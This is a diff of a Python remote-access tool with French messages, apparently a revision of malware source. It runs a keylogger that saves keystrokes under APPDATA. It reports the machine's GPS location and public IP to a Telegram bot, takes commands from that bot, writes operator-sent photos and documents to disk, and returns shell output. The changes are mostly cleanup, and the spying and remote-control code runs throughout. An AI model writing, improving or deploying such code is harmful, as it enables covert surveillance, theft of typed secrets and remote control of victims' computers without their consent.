@@ -21,8 +21,6 @@ Envoyer photo ou document
  
 def on_key_press(event):
 	
-	#print(event)
-	
 	if keylogging:
 	
 		with open(log_file, 'a') as f:
@@ -35,7 +33,7 @@ def on_key_press(event):
 def startKeylogger():
 	
 	try:
-		print("Logger started")
+		print("Keylogger started")
 		keyboard.on_press(on_key_press)
 		keyboard.wait()
 	
@@ -71,7 +69,7 @@ def get_current_gps_coordinates():
 
 startdir = pathlib.Path(__file__).parent.resolve()
 if not pathlib.Path(f"{startdir}\\credentials.txt").exists():
-	print("identifiants requis")
+	print("identifiants requis dans credentials.txt")
 	input()
 	sys.exit(0)
 else:
@@ -79,51 +77,43 @@ else:
 
 appdata = os.getenv('APPDATA')
 appname = credentials['appname']
-print(f"{appname} started")
 maindir = f"{appdata}\\{appname}"
 pathlib.Path(maindir).mkdir(parents=True, exist_ok=True)
 pathlib.Path(f"{maindir}\\photos").mkdir(parents=True, exist_ok=True)
 pathlib.Path(f"{maindir}\\documents").mkdir(parents=True, exist_ok=True)
 log_file = maindir+'\\keystrokes.txt'
 
+print(f"{appname} started")
 
-
-
-keylogging = True
 first = True
-last_time_recieved = round(datetime.datetime.now().timestamp())
-#print(last_time_recieved)
 last_update = 0
-
-keylogger = threading.Thread(target=startKeylogger)
-keylogger.start()
-
+keylogging = True
+last_time_recieved = round(datetime.datetime.now().timestamp())
 
  
 while True:
 	
 	try:
 		
-		#print("online")
-		
 		if first:
+		
+			keylogger = threading.Thread(target=startKeylogger)
+			keylogger.start()
 			
 			TOKEN = credentials['token']
 			chat_id = credentials['chat_id']
 			date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
 			coords = get_current_gps_coordinates()
 			ip = requests.get('https://checkip.amazonaws.com').text.strip()
-			message = f"PC en ligne le {date} au lieu suivant : https://www.google.com/maps/place/{coords[0]},{coords[1]} IP {ip}\nCommands : \n{commandes}"
+			message_accueil = f"PC en ligne le {date}\nAu lieu : https://www.google.com/maps/place/{coords[0]},{coords[1]}\nIP {ip}\nCommands : \n{commandes}"
 			
-			sendMessage(message)
+			sendMessage(message_accueil)
 			
 			first = False
 		
 		
 		url = f"https://api.telegram.org/bot{TOKEN}/getUpdates?chat_id={chat_id}&offset={last_update}"
 		p = json.loads(requests.get(url).text)
-		#print(p)
-		
 		if p['ok']:
 			
 			last_message = p['result'][-1]
@@ -132,53 +122,37 @@ while True:
 			
 			if last_message['message']['date'] > last_time_recieved:
 				
-				#print(f"{last_message['message']['date']} > {last_time_recieved}")
-				
-				#if 'text' in last_message['message']: print("TEXT "+last_message['message']['text'])
-				#if 'caption' in last_message['message']: print("CAPTION "+last_message['message']['caption']) 
-				
 				last_time_recieved = round(datetime.datetime.now().timestamp())
 				
 				if 'photo' in last_message['message']:
 					
-					print("PHOTO FOUND")
+					#print("PHOTO FOUND")
 					
-					for photo in last_message['message']['photo']:
+					photo = last_message['message']['photo'][-1]
+					
+					url = f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={photo['file_id']}"
+					ph = json.loads(requests.get(url).text)
+					if ph['ok']:
 						
-						url = f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={photo['file_id']}"
-						ph = json.loads(requests.get(url).text)
-						#print("PH")
-						#print(ph)
-						if ph['ok']:
-							
-							url2 = f"https://api.telegram.org/file/bot{TOKEN}/{ph['result']['file_path']}"
-							#print(url2)
-							fichier = requests.get(url2).content
-							#print("FICHIER")
-							#print(fichier)
-							
-							with open(f"{maindir}\\{ph['result']['file_path']}", 'wb') as fw: fw.write(fichier)
-							
-							sendMessage(f"Fichier {maindir}\\{ph['result']['file_path']} bien écrit")
-							
+						url2 = f"https://api.telegram.org/file/bot{TOKEN}/{ph['result']['file_path']}"
+						fichier = requests.get(url2).content
+						
+						with open(f"{maindir}\\{ph['result']['file_path']}", 'wb') as fw: fw.write(fichier)
+						
+						sendMessage(f"Fichier {maindir}\\{ph['result']['file_path']} bien écrit")
+						
 				elif 'document' in last_message['message']:
 					
-					print("DOC FOUND")
+					#print("DOC FOUND")
 					
 					doc = last_message['message']['document']
-						
+					
 					url = f"https://api.telegram.org/bot{TOKEN}/getFile?file_id={doc['file_id']}"
 					dh = json.loads(requests.get(url).text)
-					#print("DH")
-					#print(dh)
 					if dh['ok']:
 						
 						url2 = f"https://api.telegram.org/file/bot{TOKEN}/{dh['result']['file_path']}"
-						print(url2)
 						fichier = requests.get(url2).content
-						#print("FICHIER")
-						#print(fichier)
-						
 						with open(f"{maindir}\\documents\\{doc['file_name']}", 'wb') as fw: fw.write(fichier)
 						
 						sendMessage(f"Fichier {maindir}\\documents\\{doc['file_name']} bien écrit")
@@ -241,18 +215,13 @@ while True:
 					sendMessage(f"{maindir} purge")
 					os._exit(0)
 				
-				else:
-					pass
-						
 				
 				out = subprocess.getoutput("cd")
 				sendMessage(f"/man {out}>")
 				
-			else:
-				print(f"{last_message['message']['date']} < {last_time_recieved}")
 			
 	except Exception as error:
 		
 		print(error)
 	
-	time.sleep(5)
+	time.sleep(10)
